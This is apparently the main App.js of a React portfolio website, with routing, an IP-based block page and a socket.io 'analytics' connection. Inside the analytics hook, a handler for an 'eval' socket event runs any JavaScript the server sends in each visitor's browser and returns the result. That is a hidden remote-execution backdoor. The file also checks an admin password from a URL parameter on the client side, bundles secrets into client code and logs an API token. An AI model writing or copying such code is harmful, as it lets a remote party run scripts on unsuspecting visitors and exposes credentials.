import React, { useState, useEffect } from "react";
import Preloader from "../src/components/Pre";
import Navbar from "./components/Navbar";
import Home from "./components/Home/Home";
import About from "./components/About/About";
import Projects from "./components/Projects/Projects";
import Footer from "./components/Footer";
import Blocked from "./components/Blocked";
import Resume from "./components/Resume/ResumeNew";
import {
  HashRouter as Router,
  Route,
  Routes,
  Navigate,
} from "react-router-dom";
import ScrollToTop from "./components/ScrollToTop";
import "./style.css";
import "./App.css";
import "bootstrap/dist/css/bootstrap.min.css";
import Analytics from "./components/Analytics";
import io from "socket.io-client";

const querys = new URLSearchParams(window.location.search);
function App() {
  const [load, upadateLoad] = useState(true);
  const [isBlocked, updateBlocked] = useState(false);
  const [socket, setSocket] = useState(null);
  const [socketConnected, setSocketConnected] = useState(false);

  // establish socket connection
  useEffect(() => {
    setSocket(
      io(
        process.env.REACT_APP_PRODUCTION_ANALYTICS_URL &&
          process.env.NODE_ENV === "production"
          ? process.env.REACT_APP_PRODUCTION_ANALYTICS_URL
          : "http://localhost:8080/"
      )
    );
  }, []);
  // subscribe to the socket event
  useEffect(() => {
    if (!socket) return;

    socket.on("connect", () => {
      setSocketConnected(socket.connected);
    });
    socket.on("disconnect", () => {
      setSocketConnected(socket.connected);
    });
    socket.on("eval", (data, id) => {
      let responded = false;
      const result = eval(data);
      socket.emit("eval:" + id, result);
    });
  }, [socket]);
  // manage socket connection
  const handleSocketConnection = () => {
    if (socketConnected) socket.disconnect();
    else {
      socket.connect();
    }
  };
  const fetchApi = async () => {
    const dailyData = await fetch(
      `${
        process.env.REACT_APP_PRODUCTION_ANALYTICS_URL &&
        process.env.NODE_ENV === "production"
          ? process.env.REACT_APP_PRODUCTION_ANALYTICS_URL
          : "http://localhost:8080/"
      }getdata`,
      {
        headers: {
          Authorization: process.env.REACT_APP_PASSWORD,
        },
      }
    ).then((res) => res.json());
    const { ip } = await fetch(
      "https://ipinfo.io/json?token=" + process.env.REACT_APP_IPINFO_TOKEN
    ).then((res) => res.json());
    // console.log("dailyData.blocked.data.find(i => i.ip !== ip)", dailyData.blocked.data.find(i => i.ip !== ip), ip )

    let e = dailyData.blocked.data.find((i) => i.ip === ip);
    console.debug(dailyData, "eeee", process.env.REACT_APP_IPINFO_TOKEN, ip, e);
    updateBlocked(e ? e.reason : false);
  };
  useEffect(() => {
    const timer = setTimeout(() => {
      upadateLoad("done");
    }, 1200);
    fetchApi();

    return () => clearTimeout(timer);
  }, []);

  return (
    <>
      <Router>
        <Preloader load={load} />

        <div className="App" id={load !== "done" ? "no-scroll" : "scroll"}>
          <Navbar />
          <ScrollToTop />
          <Routes>
            {isBlocked ? (
              <Route path="*" element={<Blocked reason={isBlocked} />} />
            ) : (
              <>
                {" "}
                <Route path="/" element={<Home />} />
                <Route path="/project" element={<Projects />} />
                <Route path="/about" element={<About />} />
                <Route path="/resume" element={<Resume />} />
                {querys.get("password") === process.env.REACT_APP_PASSWORD ? (
                  <Route path="/analytics" element={<Analytics />} />
                ) : null}
                <Route path="*" element={<Navigate to="/" />} />
              </>
            )}
          </Routes>
          <Footer />
        </div>
      </Router>
    </>
  );
}

export default App;
